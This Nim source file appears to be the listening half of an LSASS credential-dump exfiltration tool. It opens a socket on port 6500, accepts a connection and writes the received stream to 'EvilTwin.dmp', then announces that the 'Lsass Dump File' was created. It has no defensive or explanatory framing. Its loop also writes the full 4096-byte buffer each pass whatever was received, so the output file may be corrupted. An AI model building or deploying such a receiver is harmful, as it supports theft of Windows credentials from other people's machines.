import std/net
import std/strutils

const targetPort = Port(6500)

proc receiveData(): void =
    let server = newSocket()
    var 
        client: Socket
        clientAddr: string

    server.bindAddr(targetPort)
    server.listen()
    echo "[!] Listening on Port $1..." % [$targetPort]

    server.acceptAddr(client, clientAddr)
    echo "[+] Connection from $1" % [clientAddr]

    #var receivedData = newSeq[byte]()
    echo "[!] Allocating Small Memory Block..."
    let buffer = alloc0(4096)

    let dmpFile: File = open("EvilTwin.dmp", fmAppend, 4096)
    try:
        while client.recv(buffer, 4096, 5000) != 0:
            discard dmpFile.writeBuffer(buffer, 4096)
    except TimeoutError:
        echo "[!] No Data Received Within Allotted Time..."

    echo "[+] Lsass Dump File Created!\n[!] Cleaning Up..."

    dealloc(buffer)
    client.close()
    server.close()

    echo "[!] Done!"

when isMainModule:
    receiveData()
